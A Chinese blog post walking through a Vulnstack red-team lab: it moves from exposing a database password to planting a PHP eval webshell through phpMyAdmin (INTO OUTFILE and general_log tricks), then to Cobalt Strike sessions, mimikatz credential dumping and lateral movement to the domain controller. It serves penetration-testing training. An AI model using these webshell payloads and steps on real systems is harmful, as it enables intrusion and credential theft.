---
title: "ATT&CK实战系列-红队评估（一）靶场笔记"
date: "2021-06-14T00:00:00+08:00"
lastmod: "2021-06-14T16:38:52+08:00"
description: "ATT&CK实战系列-红队评估（一）靶场笔记靶场连接 概况：虚拟机密码hongrisec@2019 登陆后需重设 win7192.168.0.1/24 桥接192.168.52.0/24 内网 win2003192.168.52.0/24 内网 win2008192.168.52.0/24 内网 靶机部署先启动win2008 DC主机再启动win2003最后启动win7win7主机C盘"
url: "/2021/06/14/ATT&CK实战系列-红队评估（一）靶场笔记/"
slug: "att-ck-shi-zhan-xi-lie-hong-dui-ping-gu-yi-ba-chang-bi-ji"
author: sshuo
source: html-legacy
commentsPath: "/2021/06/14/ATT&CK实战系列-红队评估（一）靶场笔记/"
categories: ["网络安全"]
---

## ATT&CK实战系列-红队评估（一）靶场笔记

[靶场连接](http://vulnstack.qiyuanxuetang.net/vuln/detail/7/)

###### 概况：

虚拟机密码  
hongrisec@2019 登陆后需重设

win7  
192.168.0.1/24 桥接  
192.168.52.0/24 内网

win2003  
192.168.52.0/24 内网

win2008  
192.168.52.0/24 内网

###### 靶机部署

先启动win2008 DC主机  
再启动win2003  
最后启动win7  
win7主机C盘下启动phpstudy（软件损坏无法启动，自行另外安装并且迁移WWW内除phpmyadmin外文件）

![Alt text](https://img.sshuo.cc/2021-06-14/1623657284108.png)

### 正文

先对外网服务器扫描，查看80端口。  
![@端口信息](https://img.sshuo.cc/2021-06-14/1623657298221.png)

![@存在一个探针](https://img.sshuo.cc/2021-06-14/1623657313863.png)  
![@扫描工具这里用了御剑](https://img.sshuo.cc/2021-06-14/1623657324197.png)

扫描爆破下目录，发现可以列目录。（可能是新装phpstudy导致的）发现存在敏感文件beifen.rar和phpmyadmin登录。![Alt text](https://img.sshuo.cc/2021-06-14/1623657616403.png)![Alt text](https://img.sshuo.cc/2021-06-14/1623657625898.png)

下载敏感文件解压，发现是源码。按照源码文件夹拼接url，发现一个存在一个残缺的cms，仔细查看没什么用。![Alt text](https://img.sshuo.cc/2021-06-14/1623657640936.png)

再看源码，从源码中找到数据库密码  
![Alt text](https://img.sshuo.cc/2021-06-14/1623657692122.png)  
拿到数据库root账户密码，正好可以登phpmyadmin  
先写一个一句话，路径可以从探针里获得

```
select "<?php @eval($_POST[a]);?>" into outfile (“C:/WWW/11.php”);
```

![Alt text](https://img.sshuo.cc/2021-06-14/1623657718262.png)  
失败了，有限制

改用日志试试

```
set global general_log='on'; #开启日志功能
set global general_log_file=’D:/WWW/xxx.php’; #设置日志保存地址
```

最后再查询一下，让查询内容写进去

```
select ‘<?php @eval($_POST[a]);?>’;
```

然后用菜刀连接（最开始用了蚁剑，但是连不上，原因未知。）  
![Alt text](https://img.sshuo.cc/2021-06-14/1623658096851.png)  
用菜刀再写个冰蝎以备后患，冰蝎查下权限  
![Alt text](https://img.sshuo.cc/2021-06-14/1623658125977.png)

用冰蝎弹msf shell  
![Alt text](https://img.sshuo.cc/2021-06-14/1623658199712.png)

msf无法切入shell，总是异常中断，猜测是杀软或者防火墙的原因

![Alt text](https://img.sshuo.cc/2021-06-14/1623658214602.png)  
换老方法，用webshell传个马过去，虚拟终端主动与运行静等cs上线  
![Alt text](https://img.sshuo.cc/2021-06-14/1623659124331.png)  
上手先给自己再委派几个分身，防止掉会话

往下就没啥可说了，本来想着这套靶机可以玩花样，但拿到机器就是管理员权限，剩下两台主机服务崩的崩掉的掉，也没怎么搞。还是用老路子，先mimikatz读内存里的密码。  
按网络拓扑图的思路，应该先拿下win2003，再利用域拿下win2008。这里票据传输进2003，再读密码，获得域管账户，再传输进2008。面对不出网机器需要走SMB beacon。攻击会话注意网段。
